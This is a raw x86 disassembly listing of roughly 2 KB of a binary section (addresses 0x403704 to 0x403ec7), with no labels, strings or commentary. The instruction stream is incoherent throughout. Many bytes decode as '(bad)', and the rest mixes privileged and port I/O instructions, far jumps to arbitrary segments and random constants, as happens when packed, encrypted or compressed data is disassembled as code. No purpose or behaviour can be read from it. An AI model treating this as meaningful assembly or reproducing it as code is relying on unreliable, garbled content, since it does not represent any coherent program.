  403704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403705:	ds iret 
  403707:	jg     0x403752
  403709:	ds in  eax,dx
  40370b:	jge    0x4036a4
  40370d:	leave  
  40370e:	add    esp,DWORD PTR [edx+0x3a43912e]
  403714:	(bad)  
  403715:	and    al,0x29
  403717:	mov    cl,0xce
  403719:	daa    
  40371a:	or     BYTE PTR [ebx-0x14],ch
  40371d:	dec    ecx
  40371e:	pop    ss
  40371f:	dec    edi
  403720:	adc    ecx,ebx
  403722:	cmp    eax,DWORD PTR [edx-0x586005c1]
  403728:	xchg   edx,eax
  40372a:	mov    ebp,0x429a5691
  40372f:	mov    dl,0x92
  403731:	add    DWORD PTR [edx],edx
  403733:	idiv   BYTE PTR [ecx-0x51]
  403736:	xchg   BYTE PTR [ecx],ch
  403738:	mov    ah,0x85
  40373a:	mov    edx,0x6f46d95c
  40373f:	dec    ecx
  403740:	popf   
  403741:	js     0x4036cb
  403743:	(bad)  
  403744:	mov    ds:0xa61dd678,eax
  403749:	mov    dh,0xe1
  40374b:	scas   al,BYTE PTR es:[edi]
  40374c:	mov    ch,0x88
  40374e:	repnz fs (bad) 
  403751:	jg     0x40378a
  403753:	ds jnp 0x403744
  403756:	xor    eax,0xec829501
  40375b:	adc    al,0xd0
  40375d:	(bad)  
  40375e:	ret    
  40375f:	inc    edx
  403760:	dec    edx
  403761:	cs pop eax
  403763:	jp     0x403709
  403765:	mov    al,0x33
  403767:	fdivr  DWORD PTR [ecx+ebp*4]
  40376a:	in     eax,0xe6
  40376c:	push   esp
  40376d:	cmp    eax,0x9f39b67
  403772:	jnp    0x40379f
  403774:	and    eax,0x198eda7
  403779:	out    dx,eax
  40377a:	mul    DWORD PTR [ebp+0x7e]
  40377d:	or     ah,BYTE PTR [ecx-0x5c]
  403780:	aad    0xae
  403782:	mov    ebx,0xfca6543a
  403787:	push   edi
  403788:	jns    0x40378e
  40378a:	inc    eax
  40378b:	mov    cl,0xce
  40378d:	ja     0x40374d
  40378f:	mov    al,ds:0xdd331a29
  403794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403795:	pop    edi
  403796:	pop    ebp
  403797:	mov    esp,0x46a894f9
  40379c:	xchg   ecx,eax
  40379d:	cmp    BYTE PTR [edx-0x23],bh
  4037a0:	cmp    BYTE PTR [ebx+0x23839da1],bl
  4037a6:	inc    esp
  4037a7:	ja     0x40372c
  4037a9:	mov    ah,dl
  4037ab:	mov    ch,0xb6
  4037ad:	in     eax,0xc5
  4037af:	pop    eax
  4037b0:	xor    esp,ecx
  4037b2:	pop    ds
  4037b3:	ret    
  4037b4:	enter  0x2c8,0x1d
  4037b8:	xchg   esp,eax
  4037b9:	aas    
  4037ba:	pop    ecx
  4037bb:	sahf   
  4037bc:	gs mov cl,ah
  4037bf:	push   ecx
  4037c0:	imul   eax,DWORD PTR [edx-0x6d],0x8644dab8
  4037c7:	fist   DWORD PTR [edx-0xa]
  4037ca:	sub    ebx,DWORD PTR [eax+0x6b]
  4037cd:	xchg   ecx,eax
  4037ce:	jns    0x403826
  4037d0:	xchg   dl,dh
  4037d2:	(bad)  
  4037d4:	or     cl,dh
  4037d6:	xchg   ebp,eax
  4037d7:	fwait
  4037d8:	xlat   BYTE PTR ds:[ebx]
  4037d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037da:	push   cs
  4037db:	mov    edx,0x623ca519
  4037e0:	mov    al,ds:0x58010d6d
  4037e5:	jne    0x40383a
  4037e7:	imul   edx,DWORD PTR [esi-0x7a98747d],0x77bcb6cc
  4037f1:	xor    eax,0xa5063906
  4037f6:	aad    0xf2
  4037f8:	dec    eax
  4037f9:	and    ebp,DWORD PTR [eax+ecx*4-0xb1f5818]
  403800:	push   ebp
  403801:	jge    0x403859
  403803:	and    BYTE PTR [eax+0xa],0x55
  403807:	outs   dx,BYTE PTR ds:[esi]
  403808:	xchg   ebx,eax
  403809:	pusha  
  40380a:	ins    DWORD PTR es:[edi],dx
  40380b:	sub    DWORD PTR [esi],ecx
  40380d:	or     ebx,edi
  40380f:	loopne 0x40384e
  403811:	cmp    DWORD PTR [edi-0x615dfcff],edx
  403817:	jg     0x403813
  403819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40381a:	sti    
  40381b:	dec    edx
  40381c:	hlt    
  40381d:	dec    ebp
  40381e:	lds    ebx,FWORD PTR ds:0x8b12cc67
  403824:	addr16 pop esi
  403826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403827:	sub    BYTE PTR [ebx],al
  403829:	mov    esp,0x618020d0
  40382e:	repnz pop edi
  403830:	push   0x358314d9
  403835:	cmp    esp,DWORD PTR [ecx-0x212e2172]
  40383b:	lods   al,BYTE PTR ds:[esi]
  40383c:	ins    DWORD PTR es:[edi],dx
  40383d:	push   ebx
  40383e:	fcmovbe st,st(2)
  403840:	xchg   esp,eax
  403841:	sti    
  403842:	pop    es
  403843:	mov    bh,ah
  403845:	shr    cl,cl
  403847:	int3   
  403848:	dec    ecx
  403849:	pop    ecx
  40384a:	inc    ebx
  40384b:	sbb    bl,BYTE PTR [ecx]
  40384d:	or     DWORD PTR [ebp-0x6964c4c5],edi
  403853:	sub    eax,0x4aab92dc
  403858:	jmp    0x403859
  40385a:	mov    ebx,0x88b39651
  40385f:	adc    BYTE PTR [ebx],ch
  403861:	retf   0x6269
  403864:	outs   dx,BYTE PTR ds:[esi]
  403865:	jb     0x40389f
  403867:	out    dx,eax
  403868:	jecxz  0x4038e8
  40386a:	pusha  
  40386b:	xchg   bh,dh
  40386d:	(bad)  
  40386e:	pop    esp
  40386f:	mov    WORD PTR [esi+0x39114c54],?
  403875:	in     eax,0x18
  403877:	retf   0x5b1
  40387a:	lock icebp 
  40387c:	inc    ebp
  40387d:	jo     0x403865
  40387f:	gs popa 
  403881:	mov    esi,0x3279b638
  403886:	mov    bl,0xdd
  403888:	jp     0x403896
  40388a:	nop
  40388b:	sbb    ecx,DWORD PTR [esi+edi*4]
  40388e:	xor    dl,bl
  403890:	xchg   edi,eax
  403892:	fbstp  TBYTE PTR [eax-0x6bf852e9]
  403898:	jb     0x403843
  40389a:	imul   edx,ecx,0x68
  40389d:	xchg   bl,cl
  40389f:	xor    edx,eax
  4038a1:	stc    
  4038a2:	push   ecx
  4038a3:	lods   eax,DWORD PTR ds:[esi]
  4038a4:	xchg   edi,eax
  4038a5:	scas   eax,DWORD PTR es:[edi]
  4038a6:	add    bh,BYTE PTR [ebp-0x30]
  4038a9:	frstor [esi+0x25488c5b]
  4038af:	fld    TBYTE PTR [esi-0x7abedbf3]
  4038b5:	xchg   ebx,eax
  4038b6:	adc    ebx,DWORD PTR [ecx+0xc3dac81]
  4038bc:	lock push esp
  4038be:	dec    ebx
  4038bf:	pop    edi
  4038c0:	add    al,0xef
  4038c2:	and    cl,BYTE PTR [edi+0x5f]
  4038c5:	jecxz  0x4038f0
  4038c7:	arpl   WORD PTR [ebx-0x27],dx
  4038ca:	aad    0x8f
  4038cc:	mov    bh,0x44
  4038ce:	adc    esi,edx
  4038d0:	stos   BYTE PTR es:[edi],al
  4038d1:	add    ebx,0x5c
  4038d4:	adc    eax,0x691d151f
  4038d9:	dec    ebp
  4038da:	fwait
  4038db:	retf   
  4038dc:	test   al,0xad
  4038de:	or     ebp,esp
  4038e0:	out    0x43,eax
  4038e2:	pop    ds
  4038e3:	jecxz  0x40386a
  4038e5:	inc    DWORD PTR [esi-0x74]
  4038e8:	cld    
  4038e9:	sahf   
  4038ea:	inc    ebx
  4038eb:	fxch   st(4)
  4038ed:	mov    edx,0x8ee1c272
  4038f2:	imul   ecx,DWORD PTR [edi],0xde9bc1b5
  4038f8:	mov    ds,WORD PTR [eax]
  4038fa:	sub    ecx,ebx
  4038fc:	push   edx
  4038fd:	jmp    0x74728ef6
  403902:	pop    es
  403903:	jnp    0x403984
  403905:	xor    BYTE PTR [ebp+0x52],0xe
  403909:	pop    ebp
  40390a:	cmc    
  40390b:	ror    ch,0x46
  40390e:	(bad)  
  40390f:	mov    bl,0x81
  403911:	jno    0x403957
  403913:	and    BYTE PTR [esi+ecx*8-0x40],bh
  403917:	sbb    dl,BYTE PTR [edi]
  403919:	ins    DWORD PTR es:[edi],dx
  40391a:	aam    0xf3
  40391c:	mov    eax,ds:0xd9865541
  403921:	(bad)  
  403922:	jg     0x4038cb
  403924:	jo     0x4038e3
  403926:	jecxz  0x40394a
  403928:	jmp    0xd4c0:0x2f87b65c
  40392f:	jns    0x403927
  403931:	hlt    
  403932:	stos   DWORD PTR es:[edi],eax
  403933:	jge    0x4038d0
  403935:	jmp    0x40392c
  403937:	jge    0x4039a6
  403939:	push   ebx
  40393a:	pop    eax
  40393b:	add    edi,ecx
  40393d:	sbb    dh,BYTE PTR [edi+0x25f43460]
  403943:	enter  0x6476,0xd2
  403947:	je     0x4039c4
  403949:	es stc 
  40394b:	jmp    0x4039bb
  40394d:	pop    edi
  40394e:	push   0xd8e55ba2
  403953:	mov    ebx,0xb5e00ca8
  403958:	mov    al,0x9c
  40395a:	mov    edi,0xbe0c817c
  40395f:	sub    BYTE PTR [ebp+0x6d2a7b83],dl
  403965:	sub    eax,0x53e89fea
  40396a:	loope  0x4039d5
  40396c:	sbb    BYTE PTR [esi-0x687e4550],0xd8
  403973:	call   0xe4e2:0x774b7983
  40397a:	ret    
  40397b:	cmp    eax,0x4a5182ea
  403980:	fwait
  403981:	xor    eax,0xc36d2a55
  403986:	sbb    esi,ebx
  403988:	dec    esi
  403989:	pop    eax
  40398a:	xchg   ebp,eax
  40398b:	ret    0xf54c
  40398e:	xchg   esp,eax
  40398f:	jle    0x403932
  403991:	retf   0xd9ab
  403994:	pushf  
  403995:	test   BYTE PTR [esi],0xbc
  403998:	mov    WORD PTR [esi],ss
  40399a:	xchg   esp,eax
  40399b:	jae    0x4039b3
  40399d:	sbb    al,bh
  40399f:	aam    0x71
  4039a1:	mov    ecx,0xe110f689
  4039a6:	repz sbb ebx,DWORD PTR ds:0xfea21042
  4039ad:	and    edi,DWORD PTR [esi+edx*4]
  4039b0:	push   cs
  4039b1:	xchg   esi,eax
  4039b2:	dec    esi
  4039b3:	jno    0x40397e
  4039b5:	bound  ecx,QWORD PTR [eax]
  4039b7:	xor    esp,DWORD PTR [edx+0x352b3973]
  4039bd:	shl    esi,cl
  4039bf:	in     eax,dx
  4039c0:	and    BYTE PTR ds:0x2903291a,ah
  4039c6:	out    dx,eax
  4039c7:	jnp    0x4039ca
  4039c9:	or     esp,DWORD PTR ds:0xcbbda7be
  4039cf:	lods   eax,DWORD PTR ds:[esi]
  4039d0:	(bad)  
  4039d1:	mov    esp,0xaecaf2bd
  4039d6:	ficom  WORD PTR [ebx]
  4039d8:	mov    dh,BYTE PTR [ebp+0x2adc28b3]
  4039de:	dec    eax
  4039df:	ret    0xb86
  4039e2:	jmp    0x2af0:0x11e6c380
  4039e9:	mov    ecx,0xc86aacb0
  4039ee:	jmp    0x403a67
  4039f0:	add    DWORD PTR [esi+0x75],0xd
  4039f4:	mov    fs,WORD PTR [ebp+0x79]
  4039f7:	cmp    DWORD PTR [eax-0x24],edi
  4039fa:	aaa    
  4039fb:	inc    ebx
  4039fc:	mov    ds:0xb9379153,al
  403a01:	fnstcw WORD PTR [esi+ebx*2-0x1f]
  403a05:	fwait
  403a06:	gs mov cl,0x13
  403a09:	dec    eax
  403a0a:	imul   esi,DWORD PTR [eax],0x8b2eee72
  403a10:	shl    eax,cl
  403a12:	jo     0x403a2d
  403a14:	pop    eax
  403a15:	iret   
  403a16:	out    dx,al
  403a17:	js     0x403a8a
  403a19:	bound  esp,QWORD PTR [bx]
  403a1c:	in     eax,0x3
  403a1e:	dec    esi
  403a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a20:	sub    eax,DWORD PTR [eax-0x2b]
  403a23:	mov    eax,ds:0x2a4ca462
  403a28:	inc    esp
  403a29:	and    al,0xc7
  403a2b:	cdq    
  403a2c:	rep stos BYTE PTR es:[edi],al
  403a2e:	cmovge esp,DWORD PTR [eax+eax*1]
  403a32:	arpl   bx,ax
  403a34:	jmp    0x403a03
  403a36:	les    ecx,FWORD PTR [ebx+0x62]
  403a39:	and    eax,0x1e1ebb2a
  403a3e:	xchg   esp,eax
  403a3f:	adc    al,0x6b
  403a41:	cld    
  403a42:	pop    ecx
  403a43:	adc    DWORD PTR [ebp-0x78],esi
  403a46:	loope  0x403a8a
  403a48:	pop    esi
  403a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a4a:	movq   QWORD PTR [edi-0x60199a8b],mm0
  403a51:	and    eax,0xf402ac96
  403a56:	jb     0x403a2e
  403a58:	fldcw  WORD PTR [edx]
  403a5a:	pop    ecx
  403a5b:	xor    DWORD PTR [edi-0xf],ebx
  403a5e:	dec    edi
  403a5f:	ret    0x4601
  403a62:	cld    
  403a63:	ja     0x403ac2
  403a65:	pushf  
  403a66:	xchg   BYTE PTR [eax],al
  403a68:	stc    
  403a69:	stos   BYTE PTR es:[edi],al
  403a6a:	adc    edi,DWORD PTR [esi+eiz*1+0x7a]
  403a6e:	in     al,dx
  403a6f:	data16 ja 0x403ac2
  403a72:	pop    ss
  403a73:	inc    edx
  403a74:	call   0xada3c882
  403a79:	mov    ebx,edi
  403a7b:	push   ds
  403a7c:	jo     0x403a03
  403a7e:	push   ebx
  403a7f:	jno    0x403a9b
  403a81:	add    DWORD PTR [ebp+0x33d37fe2],eax
  403a87:	daa    
  403a88:	push   eax
  403a89:	adc    BYTE PTR [ebx],dl
  403a8b:	ror    DWORD PTR [esi+0x68d81d4b],1
  403a91:	repz inc esp
  403a93:	sbb    ch,BYTE PTR ds:0x5cb40b73
  403a99:	ins    BYTE PTR es:[edi],dx
  403a9a:	je     0x403abc
  403a9c:	js     0x403b10
  403a9e:	lds    ebp,FWORD PTR [edi+eax*4+0x4c]
  403aa2:	push   ecx
  403aa3:	add    DWORD PTR [esi],0x630f1f34
  403aa9:	popa   
  403aaa:	jae    0x403b1b
  403aac:	les    esp,FWORD PTR [eax]
  403aae:	jmp    0x1448fbe8
  403ab3:	inc    edx
  403ab4:	sub    eax,0x22adffdc
  403ab9:	psadbw mm5,QWORD PTR [edx+0x3976fe25]
  403ac0:	adc    eax,0xff87b6a8
  403ac5:	dec    esi
  403ac6:	rol    DWORD PTR [ebp+0x4d1c504b],0xae
  403acd:	jecxz  0x403b35
  403acf:	mov    ecx,0x1c054126
  403ad4:	sbb    al,0x39
  403ad6:	outs   dx,BYTE PTR ds:[esi]
  403ad7:	xchg   ebx,eax
  403ad8:	mov    ch,0xb1
  403ada:	das    
  403adb:	adc    al,0x33
  403add:	(bad)  
  403ade:	xor    dh,BYTE PTR [edx]
  403ae0:	data16 std 
  403ae2:	inc    edi
  403ae3:	out    0x98,eax
  403ae5:	fidivr DWORD PTR ds:0xee10110
  403aeb:	je     0x403aca
  403aed:	pop    ecx
  403aee:	xchg   al,bh
  403af0:	dec    edx
  403af1:	jmp    0x8b87:0x42c4a698
  403af8:	pop    ds
  403af9:	mov    dl,0x97
  403afb:	or     edi,eax
  403afd:	jg     0x403b73
  403aff:	jmp    0xaf90:0x5851ef5
  403b06:	ins    DWORD PTR es:[edi],dx
  403b07:	out    dx,al
  403b08:	add    dh,BYTE PTR [edi+0x56f48c2e]
  403b0e:	push   esp
  403b0f:	mov    edi,0x86774ed2
  403b14:	xor    al,0x42
  403b16:	xchg   esp,eax
  403b17:	push   es
  403b18:	sar    DWORD PTR [esi+0x5c80ab0],cl
  403b1e:	loope  0x403ada
  403b20:	addr16 in al,dx
  403b22:	cs popf 
  403b24:	xchg   ebx,eax
  403b25:	mov    esi,0x44e0b586
  403b2a:	xor    al,0x15
  403b2c:	pop    ebx
  403b2d:	sub    ah,BYTE PTR [ebp-0x19c2b6ab]
  403b33:	jbe    0x403b61
  403b35:	loop   0x403b5a
  403b37:	test   DWORD PTR [eax+ebp*8],ebx
  403b3a:	add    al,0x18
  403b3c:	mov    ss,WORD PTR [ecx-0x8]
  403b3f:	jnp    0x403aff
  403b41:	loopne 0x403b07
  403b43:	mov    ds:0xac443b40,al
  403b48:	test   BYTE PTR cs:[ebx+edi*8],bl
  403b4c:	mov    dl,0xaa
  403b4e:	sbb    eax,0x546dfe80
  403b53:	add    edx,DWORD PTR [eax]
  403b55:	rcr    BYTE PTR [eax+0x587344a9],0xa8
  403b5c:	pusha  
  403b5d:	test   BYTE PTR [edx+0x145f2323],ch
  403b63:	jne    0x403b58
  403b65:	mov    eax,0xed6e97d1
  403b6a:	cmp    ebp,DWORD PTR [ebx-0x6fef4dea]
  403b70:	lods   al,BYTE PTR ds:[esi]
  403b71:	push   edi
  403b72:	cmp    eax,0x788e607c
  403b77:	cld    
  403b78:	and    al,0x24
  403b7a:	(bad)  
  403b7b:	out    dx,eax
  403b7c:	adc    eax,0x9890c935
  403b81:	pop    ecx
  403b82:	mov    dh,0xde
  403b84:	xchg   edi,eax
  403b85:	test   dl,al
  403b87:	int3   
  403b88:	push   ebx
  403b89:	cmp    eax,0x8d2c338b
  403b8e:	xchg   BYTE PTR [ecx+0x1ad71b2c],cl
  403b94:	add    DWORD PTR [edx-0x4],eax
  403b97:	add    al,0xd6
  403b99:	lahf   
  403b9a:	(bad)  
  403b9b:	daa    
  403b9c:	int3   
  403b9d:	mov    esi,ebp
  403b9f:	les    edi,FWORD PTR [ebx+0x50]
  403ba2:	xor    esi,DWORD PTR [ebp+0x23]
  403ba5:	loopne 0x403be9
  403ba7:	and    eax,0xb237ba0c
  403bac:	inc    ecx
  403bad:	repnz mov ah,0x68
  403bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb1:	les    ebx,FWORD PTR [edi]
  403bb3:	fild   DWORD PTR [edi+0x6f]
  403bb6:	mov    bl,0x94
  403bb8:	sbb    DWORD PTR [eax],esi
  403bba:	(bad)  
  403bbb:	xor    esi,DWORD PTR [ebp-0x8]
  403bbe:	mov    esp,0xd09d7301
  403bc3:	imul   edx,DWORD PTR [eax+0x2f4cbf1d],0xffffff9f
  403bca:	rcr    BYTE PTR [eax],0x1c
  403bcd:	mov    eax,ebp
  403bcf:	push   edx
  403bd0:	lea    esp,[edx]
  403bd2:	shl    DWORD PTR [edx-0x42],1
  403bd5:	adc    eax,0x5384c515
  403bda:	inc    eax
  403bdb:	push   es
  403bdc:	cmp    esp,ebx
  403bde:	cmc    
  403bdf:	stc    
  403be0:	cmp    BYTE PTR [esi],ch
  403be2:	bound  esi,QWORD PTR [ecx]
  403be4:	jl     0x403c22
  403be6:	nop
  403be7:	push   es
  403be8:	xchg   BYTE PTR [edi+0x27],dh
  403beb:	dec    bx
  403bed:	jp     0x403bee
  403bef:	in     al,0xab
  403bf1:	lea    esp,[eax+0x2df01225]
  403bf7:	sbb    dl,dh
  403bf9:	xor    al,0x1e
  403bfb:	dec    edx
  403bfc:	pop    ecx
  403bfd:	repnz call 0x4994:0x9a947874
  403c05:	add    DWORD PTR [eax+0x77220104],ecx
  403c0b:	scas   eax,DWORD PTR es:[edi]
  403c0c:	int3   
  403c0d:	into   
  403c0e:	xchg   esi,eax
  403c0f:	addr16 ret 
  403c11:	imul   edx,edi,0x84df6790
  403c17:	shl    BYTE PTR [edx+0x3d],1
  403c1a:	outs   dx,DWORD PTR ds:[esi]
  403c1b:	jp     0x403c3f
  403c1d:	dec    esp
  403c1e:	dec    esi
  403c1f:	fs or  esp,edi
  403c22:	push   es
  403c23:	cmp    eax,0x2fe21147
  403c28:	std    
  403c29:	leave  
  403c2a:	jne    0x403c18
  403c2c:	dec    esi
  403c2d:	inc    ebp
  403c2e:	and    edi,esi
  403c30:	push   0xfffffffd
  403c32:	popa   
  403c33:	call   0x19ad:0xb1f97b4c
  403c3a:	pusha  
  403c3b:	cmp    BYTE PTR [ebx],0x17
  403c3e:	ss imul eax,esp,0xffffffb4
  403c42:	and    bl,0x56
  403c45:	in     al,0x26
  403c47:	mov    WORD PTR [eax],gs
  403c49:	push   ss
  403c4a:	sbb    BYTE PTR [edx+0x27],0x9d
  403c4e:	xchg   BYTE PTR [ebx-0x48dde30b],ch
  403c54:	loop   0x403c1a
  403c56:	mov    al,ds:0x69ba2638
  403c5b:	lods   eax,DWORD PTR fs:[esi]
  403c5d:	or     edi,edi
  403c5f:	lea    esi,[ebx+ebp*2]
  403c62:	retf   
  403c63:	dec    esi
  403c64:	lea    edx,[edi]
  403c66:	and    eax,0xffadc1dd
  403c6b:	pusha  
  403c6c:	in     eax,dx
  403c6d:	je     0x403cdc
  403c6f:	push   0x496f9cbe
  403c74:	jle    0x403bf9
  403c76:	(bad)  
  403c77:	inc    edx
  403c78:	xor    BYTE PTR [ebx-0x74cdf502],ah
  403c7e:	in     eax,0x6c
  403c80:	shr    DWORD PTR [ecx],1
  403c82:	jmp    0x3534:0xbe5e06dc
  403c89:	jno    0x403c4b
  403c8b:	mov    db4,edx
  403c8e:	test   eax,0xc8be5035
  403c93:	mov    esi,0x315286ce
  403c98:	stc    
  403c99:	not    DWORD PTR [ebp-0x86522a0]
  403c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca0:	cdq    
  403ca1:	ss loop 0x403ca8
  403ca4:	pop    ebp
  403ca5:	push   cs
  403ca6:	cmp    ebx,eax
  403ca8:	ins    BYTE PTR es:[edi],dx
  403ca9:	jmp    0x403c9c
  403cab:	outs   dx,DWORD PTR ds:[esi]
  403cac:	inc    esi
  403cad:	(bad)  
  403cae:	dec    ebp
  403caf:	in     al,0x23
  403cb1:	pop    es
  403cb2:	sti    
  403cb3:	jno    0x403c3d
  403cb5:	nop
  403cb6:	div    ch
  403cb8:	pop    esi
  403cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cba:	xor    BYTE PTR [esp+edx*8],cl
  403cbd:	inc    esi
  403cbe:	inc    ebx
  403cbf:	or     ebx,eax
  403cc1:	dec    esi
  403cc2:	(bad)  
  403cc3:	sbb    dh,ah
  403cc5:	sub    BYTE PTR [eax-0x647ccdb5],al
  403ccb:	aad    0x20
  403ccd:	mov    DWORD PTR [edx+0x1],ecx
  403cd0:	mov    ch,0xc0
  403cd2:	in     al,0xa1
  403cd4:	imul   ebx,esi,0xce31aa51
  403cda:	sbb    edx,DWORD PTR [ebp+0xc68405b]
  403ce0:	in     eax,dx
  403ce1:	pop    edi
  403ce2:	in     eax,dx
  403ce3:	mov    ah,0x9
  403ce5:	fist   DWORD PTR [ebp-0x49dc1e6a]
  403ceb:	xlat   BYTE PTR ds:[ebx]
  403cec:	and    DWORD PTR [ebx+0xd],0xfffffff5
  403cf0:	jg     0x403cad
  403cf2:	(bad)  
  403cf4:	xchg   ebx,eax
  403cf5:	adc    al,0x8b
  403cf7:	or     DWORD PTR [edi],edx
  403cf9:	dec    ebp
  403cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cfb:	inc    BYTE PTR ds:0xf8c9c966
  403d01:	mov    eax,ds:0x62e130af
  403d06:	pop    ecx
  403d07:	adc    dh,BYTE PTR [ebp-0x1a]
  403d0a:	cs in  al,dx
  403d0c:	and    al,0x14
  403d0e:	add    bh,dh
  403d10:	test   BYTE PTR [ebx-0x1e0d51e7],ch
  403d16:	aad    0x67
  403d18:	(bad)  
  403d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d1b:	hlt    
  403d1c:	stc    
  403d1d:	add    DWORD PTR [eax],edx
  403d1f:	test   eax,0x42c4eb79
  403d24:	js     0x403d4d
  403d26:	dec    ebx
  403d27:	ror    DWORD PTR [esi-0x64],0x23
  403d2b:	mov    eax,0xf77e10c2
  403d30:	adc    DWORD PTR [edi+ebx*8-0x4c4ffa74],ebx
  403d37:	call   0xfd666dad
  403d3c:	sub    al,0xdf
  403d3e:	ret    
  403d3f:	shl    DWORD PTR [ecx+0x60df495],0x49
  403d46:	or     ch,BYTE PTR [edi+0x66]
  403d49:	out    dx,al
  403d4a:	inc    eax
  403d4b:	adc    ebp,0x33
  403d4e:	cli    
  403d4f:	push   esp
  403d50:	outs   dx,DWORD PTR ds:[esi]
  403d51:	push   ebp
  403d52:	in     al,dx
  403d53:	and    eax,0x67a157f1
  403d58:	shr    DWORD PTR [edx],cl
  403d5a:	xchg   BYTE PTR [edx-0x5fbe5b14],bh
  403d60:	mov    eax,ds:0x1e99ec2
  403d65:	and    BYTE PTR [ecx-0x4342ecde],bh
  403d6b:	and    ch,BYTE PTR [ebp+0x2d]
  403d6e:	or     ecx,DWORD PTR [edi+eiz*8+0x41070702]
  403d75:	cmp    eax,0x64a8d8ae
  403d7a:	push   0x5f
  403d7c:	in     al,dx
  403d7d:	sar    DWORD PTR [ebx+0x445d0c34],0xa5
  403d84:	xchg   edi,eax
  403d85:	sbb    eax,DWORD PTR [ecx-0x49715b9e]
  403d8b:	inc    ebp
  403d8c:	std    
  403d8d:	loope  0x403d22
  403d8f:	push   ebp
  403d90:	es loop 0x403df6
  403d93:	ds cwde 
  403d95:	cdq    
  403d96:	cmp    BYTE PTR [eax+0x12962cf9],al
  403d9c:	and    cl,dl
  403d9e:	loop   0x403d47
  403da0:	je     0x403d96
  403da2:	leave  
  403da3:	inc    esp
  403da4:	outs   dx,BYTE PTR ds:[esi]
  403da5:	pop    ss
  403da6:	or     DWORD PTR cs:[esi-0x4c],ebx
  403daa:	pop    ebx
  403dab:	test   BYTE PTR [edi-0x33],al
  403dae:	mov    ebx,0x65ec5405
  403db3:	std    
  403db4:	call   0x6573c7f7
  403db9:	cmp    BYTE PTR [edx+eax*4+0xd],0x8c
  403dbe:	bound  ebx,QWORD PTR [eax-0x5f]
  403dc1:	aas    
  403dc2:	jmp    0x737f:0xab8cb106
  403dc9:	in     eax,0xbb
  403dcb:	add    DWORD PTR [edx+0x42],ebp
  403dce:	sbb    dl,bh
  403dd0:	jbe    0x403d73
  403dd2:	daa    
  403dd3:	dec    ebx
  403dd4:	or     ebx,ecx
  403dd6:	aas    
  403dd7:	(bad)
  403dda:	xchg   ebp,eax
  403ddb:	in     eax,0x85
  403ddd:	(bad)  
  403dde:	cmc    
  403ddf:	inc    ebx
  403de0:	outs   dx,DWORD PTR ds:[esi]
  403de1:	int    0xdf
  403de3:	add    ebp,ecx
  403de5:	add    al,0x5f
  403de7:	jns    0x403d9b
  403de9:	rcr    DWORD PTR [ebx-0x45],cl
  403dec:	jg     0x403deb
  403dee:	inc    edi
  403def:	ds mov edx,0x3341b00d
  403df5:	test   eax,0xef3b7312
  403dfa:	mov    ds,WORD PTR [ecx+0x2d]
  403dfd:	dec    ebx
  403dfe:	mov    edx,0xc4fa3d83
  403e03:	cdq    
  403e04:	and    BYTE PTR [edi+0xbcba76b],bh
  403e0a:	mov    ch,0x79
  403e0c:	dec    esp
  403e0d:	jp     0x403e17
  403e0f:	int3   
  403e10:	push   0xffffffcb
  403e12:	ficom  WORD PTR [edx+eax*4+0x46]
  403e16:	inc    ebp
  403e17:	test   BYTE PTR [edx+0x6af189f3],bl
  403e1d:	mov    ds:0xdda5c1fd,al
  403e22:	sub    BYTE PTR [ebp+0x48094035],ah
  403e28:	cli    
  403e29:	(bad)  
  403e2a:	arpl   WORD PTR ds:[ecx+0x5c],sp
  403e2e:	adc    edx,DWORD PTR [ecx-0x7a]
  403e31:	ret    
  403e32:	or     ch,BYTE PTR [ecx+0x2]
  403e35:	adc    ebx,DWORD PTR [edx]
  403e37:	jge    0x403dd6
  403e39:	sbb    al,0x5c
  403e3b:	mov    ebx,0x871c79ac
  403e40:	(bad)  
  403e41:	mov    DWORD PTR [ebx-0x6],edi
  403e44:	sub    eax,0x3482dc1f
  403e49:	add    BYTE PTR [eax-0x38],ch
  403e4c:	in     eax,0x7f
  403e4e:	fdivr  QWORD PTR [ebx-0x66c25cb4]
  403e54:	add    eax,0xad090d91
  403e59:	xor    BYTE PTR [ebx+0x6fcefaf5],dh
  403e5f:	jae    0x403ed6
  403e61:	loopne 0x403e80
  403e63:	das    
  403e64:	addr16 jbe 0x403e04
  403e67:	cmp    dl,BYTE PTR [ecx-0x51]
  403e6a:	xchg   ebx,eax
  403e6b:	jb     0x403e77
  403e6d:	inc    esp
  403e6e:	scas   eax,DWORD PTR es:[edi]
  403e6f:	inc    ebp
  403e70:	mov    ecx,DWORD PTR [ebp+ecx*4-0x1b]
  403e74:	mov    edx,0x9eeac829
  403e79:	fcom   DWORD PTR [esi]
  403e7b:	shl    al,1
  403e7d:	push   ss
  403e7e:	sbb    BYTE PTR [esi],ch
  403e80:	fcom   st(2)
  403e82:	dec    edx
  403e83:	push   ecx
  403e84:	mov    dl,0xc
  403e86:	retf   
  403e87:	imul   ebp,DWORD PTR [ebx],0xffffffa8
  403e8a:	mov    eax,ds:0xe8714f7c
  403e8f:	aas    
  403e90:	jmp    0xa011:0xf402f77e
  403e97:	lahf   
  403e98:	out    dx,eax
  403e99:	jg     0x403f08
  403e9b:	lahf   
  403e9c:	in     al,dx
  403e9d:	add    eax,0x38f1b99b
  403ea2:	pop    edi
  403ea3:	iret   
  403ea4:	stos   BYTE PTR es:[edi],al
  403ea5:	ret    
  403ea6:	and    eax,0x9738c720
  403eab:	sets   BYTE PTR [esi]
  403eae:	fisub  WORD PTR [edx+0x6f]
  403eb1:	sbb    BYTE PTR [ecx+0x73633d82],cl
  403eb7:	outs   dx,BYTE PTR ds:[esi]
  403eb8:	xchg   esp,eax
  403eb9:	push   0x73
  403ebb:	es pop edx
  403ebd:	pop    ecx
  403ebe:	enter  0x7f12,0xe
  403ec2:	jae    0x403f34
  403ec4:	lds    edx,FWORD PTR [ebx]
  403ec6:	inc    eax
  403ec7:	ret    
